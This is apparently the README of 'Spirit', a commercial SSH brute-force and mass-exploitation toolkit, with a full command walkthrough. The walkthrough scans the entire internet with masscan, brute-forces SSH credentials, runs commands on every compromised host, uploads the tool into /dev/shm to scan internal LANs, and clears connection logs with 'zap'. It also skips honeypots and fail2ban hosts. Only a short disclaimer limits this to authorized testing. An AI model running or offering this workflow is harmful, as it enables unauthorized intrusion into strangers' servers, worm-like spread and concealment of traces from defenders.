# Spirit - Network Pentest Tools

### [Download the latest Spirit release](https://github.com/theaog/spirit/releases)

> [`$ ./spirit --help`](./HELP) shows you all the included tools. \
Most commands have subcommands `./spirit <command> --help`

> [Spirit Partner Program](./PARTNER.md) earn XMR and join our Telegram Community.

## Quick Start
```bash
# Install masscan
sudo apt install masscan
# copy masscan into your CWD (current working directory)
cp `which masscan` .

# download go.sh script
wget https://raw.githubusercontent.com/theaog/spirit/master/script/go.sh
# download spirit
wget https://github.com/theaog/spirit/releases/download/1.30/spirit.tgz
# unpack spirit
tar xvf spirit.tgz

# give execution rights to the go.sh script
chmod +x go.sh
# start the show!
./go.sh 208 2122,3322,9922 50000
```

## Example usage for SSH brute flow TLDR;
```bash
# First scan your network or the internet (check disclaimer) to acquire a list of open ports.
$ masscan \
    --rate="50000" \
    --ports "22,222,2222,2212" 0.0.0.0/0 \
    --exclude 255.255.255.255 \
    -oG open.lst
Scanning 4294967295 hosts [4 ports/host]
# masscan will create an open.lst file in oG (output Greppable) format.

# Parse this open.lst to format the data, so that spirit can understand it.
$ ./spirit parse
INFO created h.lst in HOST:PORT format

# Optional: create a filter.lst file if you want to skip certain SSH versions.
$ cat >filter.lst<< EOF
SSH-1.0
SSH-2.0-CISCO
SSH-2.0-Comware
EOF

# Grab SSH banners to make sure your target version is running on the host. NOTE: Makes a backup of h.lst to h.lst.bak
$ ./spirit banner
INFO backing up h.lst to h.lst.bak
SSH-2.0-OpenSSH_8.2p  13% [=>                  ] [11s:1m15s]
INFO created h.lst in HOST:PORT:BANNER format
head -n1 h.lst
100.100.100.100:2222:SSH-2.0-OpenSSH_6.6.1

# Add a password list, spirit will automatically load user:pass from a p.lst file.
# NOTE: if p.lst is not present, Spirit uses an internal passfile
$ cat > p.lst << EOF
user1:pass1
user1:pass2
user2:pass50
EOF

# Start bruting...
$ ./spirit brute
INFO loaded h.lst with 26803 hosts
INFO loaded p.lst with 4881 logins
[2478/4653]root:!1qwerty [77]found [33]blocked [1284]threads 20% [====>               ] [20s:1h13m36s]
failed connections statistics:
(    7)  ssh: closed network connection 30s timeout
(    7)  total failed
results stored in:
- found.ssh # for quick manual connect
- found.login # user:pass combinations that worked
- found.lst # used by `spirit omni` for connecting en-masse
[26803]hosts [4000]bruted [3000]found [19803]blocked

# Connect to all your found hosts automatically & run commands.
# omni will automatically attempt to connect to hosts present in the found.lst file,
# run commands on them and display the output to you.
$ ./spirit omni -c 'whoami && uptime'
# Upload spirit to all hosts and scan the LAN
$ ./spirit omni -u ./spirit -c '/dev/shm/spirit scan --lan'
```

> Tip: you can automate these steps with `./spirit auto-brute` for continuous automatic probing on random ports & bruting. ![forever](asset/forever.png)

## Upgrade Spirit automaticaly
```bash
./spirit upgrade
Upgrading 87% [========================>     ] (5.9/5.9 MB, 49.652 MB/s)
```

## Spirit is Free (sorta)
For `local IP` (10/172/192) ranges and up to 1,000 `public IPs`

If you need to pen-test more than 1,000 public IP or need Pro features we charge a small fee to help us support the project development. Use `./spirit buy` to upgrade.

## Spirit Pro
Buy a Spirit Pro license directly from the CLI `./spirit buy`. Every license helps support our development and server costs.

## Key Features
- extracts SSH banners accurately (retry failed hosts) and fast (many threads)
- brute multiple ports at once: 1.1.1.1:22, 1.1.1.1:23, etc.
- brute using private keys `./spirit brute-key --file id_rsa`
- brute auto-blocks honeypots not wasting time nor giving away all your passwords
- brute also blocks hosts that are unreachable, or have fail2ban installed (less dull work, faster scanning)
- brute will try every connection twice before blocking unreachable hosts to increase accuracy
- very light on server load, your CPU will thank you!
- `./spirit omni -c 'uptime'` connect to all your found hosts at once, upload files and execute remote commands
- `./spirit zap` clean connection logs 
- `./spirit masscan --zone zone.lst --rate 10_000` masscan whole zones automatically 
- `./spirit auto-brute` scan & brute your network on random ports over and over -- spot vulnerabilities before they happen
- `./spirit exploit` test targets for common local and remote exploits
- and more... [`$ ./spirit --help`](./HELP) 

# Support our development
## Monero (XMR) thank you! (our favorite)
`895LJnKcfTv7NHf7SN1zz5UzhBRwwvdR8NYLvXNr54jJ3GXghBoyfBKLp2dL4GcYohQatRnigct8zgK6utkjjeBxVNsky1s`

![xmrqr](asset/xmrqr.png)

## Bitcoin (BTC) thank you too!
`bc1q7plm79dgllrhrjz772x4vjrtvu9yy03738psy5`

## Get Help & Support
Open a Github [issue](https://github.com/theaog/spirit/issues) and consider encrypting your message using this pub key [aog.gpg](asset/aog.gpg).

Don't forget to give us a Star!

> NOTICE: rumors have been circulating that `spirit` contains a backdoor -- that's not true, we would never do that.
> We offer a bounty of 50XMR to whomever opens an issue in this repo and provides undeniable proof of the "alleged" backdoor.

# Disclaimer

This tool should be used for authorized penetration testing and/or educational purposes only.
Any misuse of this software will not be the responsibility of the author or of any other collaborator.
Use it on your own systems and/or with the system owner's permission.

Usage of any tools in this repository for attacking targets without prior mutual consent is illegal.
It is the end user’s responsibility to obey all applicable local, state and federal laws.
We assume no liability and are not responsible for any misuse or damage caused.
